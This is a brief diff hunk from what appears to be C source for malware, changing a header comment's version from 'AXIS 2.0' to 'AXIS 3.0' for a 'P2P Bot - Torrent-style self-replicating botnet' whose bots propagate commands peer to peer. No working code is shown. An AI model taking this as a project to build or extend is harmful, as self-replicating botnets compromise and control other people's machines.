@@ -17,7 +17,7 @@
 #endif
 
 /* ============================================================================
- * AXIS 2.0 P2P Bot - Torrent-style self-replicating botnet
+ * AXIS 3.0 P2P Bot - Torrent-style self-replicating botnet
  * ============================================================================
  * Every bot:
  * 1. Acts as a P2P peer for command propagation
